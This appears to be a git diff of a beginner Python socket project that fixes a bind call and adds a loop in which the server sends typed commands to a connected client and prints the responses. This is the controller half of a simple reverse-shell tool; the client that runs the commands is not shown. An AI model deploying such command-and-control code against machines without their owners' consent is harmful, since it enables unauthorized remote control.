@@ -3,7 +3,7 @@ import sys
 
 # Create socket (allows two computers to talk)
 
-def create_socket():
+def socket_create():
 	try: 
 		global host
 		global port
@@ -24,7 +24,7 @@ def socket_bind():
 
 		# print to track binding attempts
 		print('Binding socket to port: ' + str(port))
-		socket.bind((host, port))
+		s.bind((host, port))
 
 		# VERY IMPORTANT, 5 is # of bad connections before refusing
 		s.listen(5)
@@ -43,6 +43,27 @@ def socket_accept():
 	# not created yet
 	send_commands(conn) 
 	conn.close()
+
+# send commands to client
+def send_commands(conn):
+	while True:
+		cmd = input()
+		if cmd == 'quit':
+			conn.close()
+			s.close()
+			sys.exit()
+		if len(str.encode(cmd)) > 0:
+			conn.send(str.encode(cmd))
+			client_response = str(conn.recv(1024), "utf-8")
+			print(client_response, end = "")
+
+def main():
+	socket_create()
+	socket_bind()
+	socket_accept()
+
+main()
+
  
 
   
